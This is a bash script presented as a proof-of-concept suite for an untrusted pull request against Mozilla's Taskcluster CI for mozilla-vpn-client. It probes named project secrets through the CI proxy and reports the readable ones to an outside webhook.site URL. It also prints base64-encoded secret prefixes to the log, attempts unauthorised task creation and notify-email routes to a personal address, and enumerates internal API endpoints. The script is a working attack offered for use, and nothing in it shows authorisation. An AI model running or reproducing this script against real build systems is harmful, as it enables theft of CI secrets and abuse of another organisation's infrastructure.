#!/bin/bash
# FirefoxCI PoC Suite - mozilla-vpn-client untrusted PR
# Khong dung set -e de script chay het du 1 poc fail

WEBHOOK_URL="https://webhook.site/2e7af29f-f5f5-4650-a012-99d14df3f88a"
MY_EMAIL="brian.baker@xketamine.me"
PROXY_URL="${TASKCLUSTER_PROXY_URL:-http://taskcluster}"
ROOT_URL="https://firefox-ci-tc.services.mozilla.com"

echo "========================================"
echo "[*] FirefoxCI PoC Suite - Untrusted PR"
echo "[*] Task ID: ${TASK_ID:-unknown}"
echo "[*] Proxy URL: ${PROXY_URL}"
echo "[*] Started at: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo "========================================"

# Helper: tao task ID dung format (slugid-like 22 chars)
gen_task_id() {
    python3 -c "import uuid,base64; u=uuid.uuid4().bytes; print(base64.urlsafe_b64encode(u)[:22].decode())" 2>/dev/null || \
    cat /proc/sys/kernel/random/uuid | tr -d '-' | cut -c1-22
}

# ------------------------------------------------
# PoC 01: Secret Read - thu nhieu namespace
# ------------------------------------------------
echo ""
echo "[*] === PoC 01: Secret Read ==="

for SECRET_NAME in \
  "project/mozillavpn/ci/dummy-test-secret" \
  "project/mozillavpn/tokens" \
  "project/mozillavpn/github" \
  "project/mozillavpn/sentry" \
  "garbage-test-404"; do

    echo "[*] Probing: ${SECRET_NAME}"
    TMP="/tmp/sec_$$_${SECRET_NAME//\//_}"

    STATUS=$(curl -s -o "$TMP" -w "%{http_code}" \
      --max-time 8 \
      "${PROXY_URL}/api/secrets/v1/secret/${SECRET_NAME}" 2>/dev/null || echo "000")

    LEN=$(wc -c < "$TMP" 2>/dev/null || echo 0)
    echo "[*]   Status: ${STATUS}, Length: ${LEN}b"

    if [ "${STATUS}" = "200" ]; then
        PREFIX=$(head -c 20 "$TMP" | base64 -w 0)
        echo "[*]   ACCESSIBLE! Prefix(b64): ${PREFIX}"
        curl -s -o /dev/null \
          "${WEBHOOK_URL}?poc=01&secret=${SECRET_NAME}&status=${STATUS}&len=${LEN}" 2>/dev/null || true
    elif [ "${STATUS}" = "403" ]; then
        echo "[*]   DENIED (403) - API reachable but scope missing"
    elif [ "${STATUS}" = "404" ]; then
        echo "[*]   NOT FOUND (404)"
    fi
    rm -f "$TMP"
done

# ------------------------------------------------
# PoC 02: Secondary Task - dung PUT /task/<id>
# ------------------------------------------------
echo ""
echo "[*] === PoC 02: Secondary Task Creation ==="

NEW_ID=$(gen_task_id)
TS=$(date -u +%Y-%m-%dT%H:%M:%S.000Z)
DL=$(date -u -d '+1 hour' +%Y-%m-%dT%H:%M:%S.000Z 2>/dev/null || date -u -v+1H +%Y-%m-%dT%H:%M:%S.000Z)
EXP=$(date -u -d '+1 day' +%Y-%m-%dT%H:%M:%S.000Z 2>/dev/null || date -u -v+1d +%Y-%m-%dT%H:%M:%S.000Z)

echo "[*] Task ID: ${NEW_ID}"

cat > /tmp/poc02.json <<EOF
{
  "provisionerId": "mozillavpn-1",
  "workerType": "b-linux-large",
  "schedulerId": "mozillavpn-level-1",
  "taskGroupId": "${NEW_ID}",
  "created": "${TS}",
  "deadline": "${DL}",
  "expires": "${EXP}",
  "metadata": {
    "name": "Secondary Task PoC",
    "description": "Proof of arbitrary task creation",
    "owner": "security-research@example.com",
    "source": "https://github.com/mozilla-mobile/mozilla-vpn-client"
  },
  "payload": {
    "command": ["/bin/bash","-c","echo done"],
    "image": "taskcluster/ubuntu:latest",
    "maxRunTime": 300
  }
}
EOF

# Thu PUT /task/<id> truoc
STATUS=$(curl -s -o /tmp/poc02_resp.json -w "%{http_code}" \
  -X PUT -H "Content-Type: application/json" -d @/tmp/poc02.json \
  --max-time 15 \
  "${PROXY_URL}/api/queue/v1/task/${NEW_ID}" 2>/dev/null || echo "000")

echo "[*] PUT /task/<id> status: ${STATUS}"

if [ "${STATUS}" != "200" ]; then
    # Thu POST /create-task/<id> neu PUT fail
    STATUS=$(curl -s -o /tmp/poc02_resp.json -w "%{http_code}" \
      -X POST -H "Content-Type: application/json" -d @/tmp/poc02.json \
      --max-time 15 \
      "${PROXY_URL}/api/queue/v1/create-task/${NEW_ID}" 2>/dev/null || echo "000")
    echo "[*] POST /create-task/<id> status: ${STATUS}"
fi

if [ "${STATUS}" = "200" ]; then
    echo "[*] SUCCESS. Task ID: ${NEW_ID}"
    echo "[*] Verify: ${ROOT_URL}/tasks/${NEW_ID}"
    curl -s -o /dev/null \
      "${WEBHOOK_URL}?poc=02&task_id=${NEW_ID}&status=${STATUS}" 2>/dev/null || true
else
    echo "[*] FAILED. Response preview: $(head -c 300 /tmp/poc02_resp.json 2>/dev/null || echo 'N/A')"
fi
rm -f /tmp/poc02.json /tmp/poc02_resp.json

# ------------------------------------------------
# PoC 03: Notify Route
# ------------------------------------------------
echo ""
echo "[*] === PoC 03: Notify Route ==="

NOTIFY_ID=$(gen_task_id)
DL=$(date -u -d '+1 hour' +%Y-%m-%dT%H:%M:%S.000Z 2>/dev/null || date -u -v+1H +%Y-%m-%dT%H:%M:%S.000Z)
EXP=$(date -u -d '+1 day' +%Y-%m-%dT%H:%M:%S.000Z 2>/dev/null || date -u -v+1d +%Y-%m-%dT%H:%M:%S.000Z)

cat > /tmp/poc03.json <<EOF
{
  "provisionerId": "mozillavpn-1",
  "workerType": "b-linux-large",
  "schedulerId": "mozillavpn-level-1",
  "taskGroupId": "${NOTIFY_ID}",
  "created": "${TS}",
  "deadline": "${DL}",
  "expires": "${EXP}",
  "routes": ["notify.email.${MY_EMAIL}.on-completed"],
  "metadata": {
    "name": "Notify Route PoC",
    "description": "Triggers email notify",
    "owner": "security-research@example.com",
    "source": "https://github.com/mozilla-mobile/mozilla-vpn-client"
  },
  "payload": {
    "command": ["/bin/bash","-c","echo done"],
    "image": "taskcluster/ubuntu:latest",
    "maxRunTime": 300
  }
}
EOF

STATUS=$(curl -s -o /tmp/poc03_resp.json -w "%{http_code}" \
  -X PUT -H "Content-Type: application/json" -d @/tmp/poc03.json \
  --max-time 15 \
  "${PROXY_URL}/api/queue/v1/task/${NOTIFY_ID}" 2>/dev/null || echo "000")

echo "[*] createTask status: ${STATUS}"

if [ "${STATUS}" = "200" ]; then
    echo "[*] SUCCESS. Check inbox ${MY_EMAIL} in 2-5 min."
    echo "[*] Task: ${ROOT_URL}/tasks/${NOTIFY_ID}"
else
    echo "[*] FAILED. Response: $(head -c 300 /tmp/poc03_resp.json 2>/dev/null || echo 'N/A')"
fi
rm -f /tmp/poc03.json /tmp/poc03_resp.json

# ------------------------------------------------
# PoC 04: Internal Service Probe via proxy API
# ------------------------------------------------
echo ""
echo "[*] === PoC 04: Internal Service Probe ==="
echo "[*] Probing via taskclusterProxy API endpoints..."

printf "%-45s | %-6s | %-10s\n" "ENDPOINT" "STATUS" "LENGTH"
printf "%-45s-+-%6s-+-%10s\n" "---------------------------------------------" "------" "----------"

for endpoint in \
  "${PROXY_URL}/" \
  "${PROXY_URL}/api/auth/v1/" \
  "${PROXY_URL}/api/queue/v1/" \
  "${PROXY_URL}/api/secrets/v1/" \
  "${PROXY_URL}/api/notify/v1/" \
  "${PROXY_URL}/api/hooks/v1/" \
  "${PROXY_URL}/api/index/v1/" \
  "${PROXY_URL}/api/worker-manager/v1/" \
  "${PROXY_URL}/api/object/v1/" \
  "${PROXY_URL}/api/github/v1/"; do

    RESULT=$(curl -s -o /dev/null -w "%{http_code},%{size_download}" \
      --max-time 5 \
      "$endpoint" 2>/dev/null || echo "000,0")

    S=$(echo "$RESULT" | cut -d',' -f1)
    L=$(echo "$RESULT" | cut -d',' -f2)
    printf "%-45s | %-6s | %-10s\n" "$endpoint" "$S" "${L}b"
done

echo ""
echo "[*] === All PoCs completed ==="